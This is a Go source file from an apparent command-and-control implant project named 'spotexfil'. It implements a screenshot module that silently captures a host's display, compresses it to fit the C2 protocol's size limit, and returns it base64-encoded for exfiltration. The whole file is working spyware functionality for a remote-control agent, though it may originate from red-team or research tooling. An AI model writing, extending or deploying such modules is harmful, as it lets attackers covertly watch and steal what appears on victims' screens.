package c2

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image"
	"image/jpeg"

	"github.com/kbinani/screenshot"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
)

// ScreenshotModule captures the host's screen and returns it as a base64 JPEG.
type ScreenshotModule struct{}

func (m *ScreenshotModule) Name() string { return "screenshot" }

func (m *ScreenshotModule) Execute(args map[string]interface{}) (string, string) {
	display := 0
	if d, ok := args["display"].(float64); ok {
		display = int(d)
	}

	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return "error", "No active displays found"
	}
	if display < 0 || display >= n {
		return "error", fmt.Sprintf("Invalid display index %d (have %d display(s))", display, n)
	}

	img, err := screenshot.CaptureDisplay(display)
	if err != nil {
		return "error", err.Error()
	}

	maxSize := shared.Proto.C2.MaxResultSize
	jpegBytes, err := encodeJPEG(img, maxSize)
	if err != nil {
		return "error", err.Error()
	}

	return "ok", "b64:" + base64.StdEncoding.EncodeToString(jpegBytes)
}

// encodeJPEG encodes img as JPEG, trying progressively lower quality settings
// until the result fits within maxSize bytes.
func encodeJPEG(img image.Image, maxSize int) ([]byte, error) {
	for _, quality := range []int{75, 50, 30} {
		var buf bytes.Buffer
		if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
			return nil, err
		}
		if buf.Len() <= maxSize {
			return buf.Bytes(), nil
		}
	}
	return nil, fmt.Errorf("Screenshot too large: %d bytes (max %d)", encodedLen(img), maxSize)
}

// encodedLen returns the JPEG size at the lowest attempted quality, for error reporting.
func encodedLen(img image.Image) int {
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 30}); err != nil {
		return -1
	}
	return buf.Len()
}
